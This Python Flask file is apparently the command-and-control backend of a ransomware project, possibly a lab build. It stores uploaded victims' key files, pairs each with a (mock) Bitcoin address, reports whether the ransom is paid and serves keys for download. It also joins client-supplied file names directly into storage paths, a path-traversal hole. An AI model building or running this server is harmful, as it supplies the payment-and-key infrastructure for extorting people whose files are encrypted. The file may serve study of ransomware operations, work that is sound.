from flask import Flask, request, jsonify, send_file
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_limiter.errors import RateLimitExceeded
import os
import logging
import uuid
import json
import sys
from datetime import datetime, timezone
import sqlite3
import random
from C2_Variables import DB_PATH, KEY_STORAGE_DIR, api_key, session_token_expiration, seconds_left, active_sessions
from Threading import start_mock_payment, start_remove_expired_keys
from Database import init_db


####################################################################################################################

app = Flask(__name__)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["20 per minute"]
)

logging.getLogger('werkzeug').setLevel(logging.ERROR)

logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[
        logging.FileHandler('log.json'), # This will pump out into .json file
        logging.StreamHandler(sys.stdout) # This will pump out into terminal
    ]
)

####################################################################################################################

init_db()
start_remove_expired_keys()
start_mock_payment()

####################################################################################################################

@app.route('/create_session', methods=['POST'])
def init_session():
    received_api_key = request.headers.get('API-KEY')
    if received_api_key != api_key:
        return jsonify({"error": "Invalid API Key"}), 403

    session_token = str(uuid.uuid4())
    
    expiration_time = datetime.now(timezone.utc) + session_token_expiration
    active_sessions[session_token] = expiration_time

    return jsonify({"session_token": session_token})

####################################################################################################################

@app.route('/upload_key', methods=['POST'])
def upload_key():
    received_api_key = request.headers.get('API-KEY')
    if received_api_key != api_key:
        return jsonify({"error": "Invalid API Key"}), 403
    key_file = request.files.get('key')
    if not key_file:
        return jsonify({"error": "No key provided"}), 400 # Debug Message
    
    session_token = request.headers.get('Session-Token')
    expiration_time = active_sessions.get(session_token)
    if not expiration_time:
        return jsonify({"error": "Invalid session token"}), 401
    if datetime.now(timezone.utc) > expiration_time:
        del active_sessions[session_token]
        return jsonify({"error": "Session token expired"}), 401

    key_filename = key_file.filename
    key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
    btc_address = f"mock_btc_{random.randint(1000,9999)}"

    try:
        key_file.save(key_path)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO payments (unique_id, btc_address, paid) VALUES (?, ?, ?)',
                  (key_filename, btc_address, False))
        conn.commit()
        conn.close()
        return jsonify({"message": "Key uploaded", "file": key_filename, "btc_address": btc_address}), 200 # Debug Message
    except Exception as e:
        return jsonify({"error": str(e)}), 500 # Debug Message

####################################################################################################################

@app.route('/get_key/<unique_id>', methods=['GET'])
def get_key(unique_id):
    received_api_key = request.headers.get('API-KEY')
    if received_api_key != api_key:
        return jsonify({"error": "Invalid API Key"}), 403
    
    session_token = request.headers.get('Session-Token')
    expiration_time = active_sessions.get(session_token)
    if not expiration_time:
        return jsonify({"error": "Invalid session token"}), 401
    if datetime.now(timezone.utc) > expiration_time:
        del active_sessions[session_token]
        return jsonify({"error": "Session token expired"}), 401
    
    key_path = os.path.join(KEY_STORAGE_DIR, unique_id)

    if not os.path.exists(key_path):
        return jsonify({"error": "Key not found"}), 404 # Debug Message

    try:
        return send_file(
            key_path,
            mimetype='application/x-pem-file',
            as_attachment=True,
            download_name=unique_id
        )
    except Exception as e:
        return jsonify({"Error": str(e)}), 500 # Debug Message

####################################################################################################################

@app.route('/payment_status/<unique_id>', methods=['GET'])
def payment_status(unique_id):
    received_api_key = request.headers.get('API-KEY')
    if received_api_key != api_key:
        return jsonify({"error": "Invalid API Key"}), 403
    
    session_token = request.headers.get('Session-Token')
    expiration_time = active_sessions.get(session_token)
    if not expiration_time:
        return jsonify({"error": "Invalid session token"}), 401
    if datetime.now(timezone.utc) > expiration_time:
        del active_sessions[session_token]
        return jsonify({"error": "Session token expired"}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT paid FROM payments WHERE unique_id = ?', (unique_id,))
    result = c.fetchone()
    conn.close()

    if result is None:
        return jsonify({"error": "Unique ID not found"}), 404

    paid = bool(result[0])
    return jsonify({"unique_id": unique_id, "paid": paid}), 200

####################################################################################################################

@app.errorhandler(RateLimitExceeded)
def ratelimit_handler(e):
    return jsonify(error="rate limit exceeded"), 429

####################################################################################################################

@app.after_request
def log_response(response):
    response_data = {}
    if response.is_json:
        response_data = response.get_json()
    log_entry = {
        "time": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "method": request.method,
        "endpoint": request.path,
        "status": response.status_code,
        "response": response_data
    }
    logging.info(json.dumps(log_entry))
    return response

####################################################################################################################

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

####################################################################################################################